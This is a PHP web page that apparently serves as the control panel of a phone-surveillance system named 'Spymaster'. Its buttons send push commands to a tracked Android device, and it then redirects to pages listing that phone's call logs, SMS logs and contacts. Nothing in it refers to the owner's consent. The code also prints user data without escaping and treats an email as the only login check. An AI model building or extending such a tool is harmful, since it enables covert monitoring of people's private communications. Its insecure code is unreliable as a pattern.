<!--
To change this template, choose Tools | Templates
and open the template in the editor.
-->
<!DOCTYPE html>
<?php
session_start();
?>
<html>
    <head>
        <title></title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
        <!-- Bootstrap -->
        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
        <script src="bootstrap/js/bootstrap.min.js"></script>
        <script type="text/javascript">
        </script>
        <script type="text/javascript">
            $(document).ready(function() {

            });
            function sendPushNotification(id) {

                if (id == 1)
                    var data = "Phone";
                else if (id == 2)
                    var data = "SMSLog";
                else if (id == 3)
                    var data = "Contact";
                else
                    var data = "Unknown";

                $('form#' + id).unbind('submit');

                regId = $("#regId").val();

                $.ajax({
                    url: "send_message.php",
                    type: 'GET',
                    data: {regId: regId, message: data},
                    beforeSend: function() {

                    },
                    success: function(data, textStatus, xhr) {

                        $('.txt_message').val("");
                        if (id == 1)
                            window.location.assign("http://mobileprojectdemo.orgfree.com/gcm_server_php/phonelogs.php");
                        else if (id == 2)
                            window.location.assign("http://mobileprojectdemo.orgfree.com/gcm_server_php/smslogs.php");
                        else if (id == 3)
                            window.location.assign("http://mobileprojectdemo.orgfree.com/gcm_server_php/contactlist.php");
                    },
                    error: function(xhr, textStatus, errorThrown) {
                        alert("Error");
                    }
                });
                return false;
            }
        </script>
        <style type="text/css">
            .container{
                width: 950px;
                margin: 0 auto;
                padding: 0;
            }
            h1{
                font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
                font-size: 24px;
                color: #777;
            }
            div.clear{
                clear: both;
            }
            ul.devices{
                margin: 0;
                padding: 0;
            }
            ul.devices li{
                float: left;
                list-style: none;
                border: 1px solid #dedede;
                padding: 10px;
                margin: 0 15px 25px 0;
                border-radius: 3px;
                -webkit-box-shadow: 0 1px 5px rgba(0, 0, 0, 0.35);
                -moz-box-shadow: 0 1px 5px rgba(0, 0, 0, 0.35);
                box-shadow: 0 1px 5px rgba(0, 0, 0, 0.35);
                font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
                color: #555;
            }
            ul.devices li label, ul.devices li span{
                font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
                font-size: 12px;
                font-style: normal;
                font-variant: normal;
                font-weight: bold;
                color: #393939;
                display: block;
                float: left;
            }
            ul.devices li label{
                height: 25px;
                width: 50px;
            }
            ul.devices li textarea{
                float: left;
                resize: none;
            }
            ul.devices li .send_btn{
                background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#0096FF), to(#005DFF));
                background: -webkit-linear-gradient(0% 0%, 0% 100%, from(#0096FF), to(#005DFF));
                background: -moz-linear-gradient(center top, #0096FF, #005DFF);
                background: linear-gradient(#0096FF, #005DFF);
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3);
                border-radius: 3px;
                color: #fff;
            }

        </style>
        <style>
            body {background-image:url('bootstrap/img/Spymaster.jpg');background-repeat: no-repeat;background-position:right top;}
            .center{
                position: absolute;
                height: 200px;
                width: 400px;
                margin: -100px 0 0 -200px;
                top: 50%;
                left: 50%;

            }
            .left{
                position:relative;
                top:55%;
                left: 1%;
            }

        </style>
    </head>
    <body>
        <br/>
        <br/>
        <ul class="nav nav-pills ">
            <li class="active"><a href="index1.php">Spymaster System</a></li>
            <li><a href="contactus.html"> Contact Us</a></li>
            <li><a href="AboutUs.html">About</a></li>
        </ul>
        <br/>
        <br/>
        <?php
        include_once 'db_functions.php';
        $db = new DB_Functions();

        $name = $_POST['txtName'];
        $email = $_POST['txtEmail'];
        $phone = $_POST['txtPhoneno'];

        if ($name != "" && $email != "" && $phone != "") {
            $_SESSION['name'] = $name;
            $_SESSION['email'] = $email;
            $_SESSION['phone'] = $phone;
        }
        $users = $db->getUserByEmail($_SESSION['email']);
        if ($users != false)
            $no_of_users = mysql_num_rows($users);
        else
            $no_of_users = 0;
        ?>
        <fieldset>
            <div class="container">

                <ul class="devices">
                    <?php
                    if ($no_of_users > 0) {
                        ?>
                        <span class="label label-important large badge"> Welcome <?php echo $_SESSION['name'] ?></span>
                        <span class="label label-important large badge"> Email : <?php echo $_SESSION['email'] ?></span>
                        <span class="label label-important large badge"> Phone Number : <?php echo $_SESSION['phone'] ?></span>
                        <br/>
                        <br/>
                        <?php
                        while ($row = mysql_fetch_array($users)) {
                            ?>
                            <li>

                                <label>Name: </label> <span><?php echo $row["name"] ?></span>
                                <div class="clear"></div>
                                <label>Email:</label> <span><?php echo $row["email"] ?></span>
                                <div class="clear"></div>
                                <div class="send_container">
                                    <input type="hidden" name="message" value="AAA"/>
                                    <input type="hidden" name="regId" id="regId" value="<?php echo $row["gcm_regid"] ?>"/>
                                    <input type="button" id="1" class="send_btn" value="Phone Logs " onclick="sendPushNotification(this.id)"/>

                                    <input type="hidden" name="message" value="BBB"/>
                                    <input type="hidden" name="regId" id="regId" value="<?php echo $row["gcm_regid"] ?>"/>
                                    <input type="button" id="2" class="send_btn" value="SMS Logs" onclick="sendPushNotification(this.id)"/>


                                    <input type="hidden" name="message" value="CCC"/>
                                    <input type="hidden" name="regId" id="regId" value="<?php echo $row["gcm_regid"] ?>"/>
                                    <input type="button" id="3" class="send_btn" value="Contact List" onclick="sendPushNotification(this.id)"/>
                                </div>
                            </li>
                            <?php
                        }
                    } else {
                        ?>
                        <li>
                            Invalid Login details provided . Phone not tracked by SpyMaster !
                        </li>
                    <?php } ?>
                </ul>
            </div>
        </fieldset>
    </body>
</html>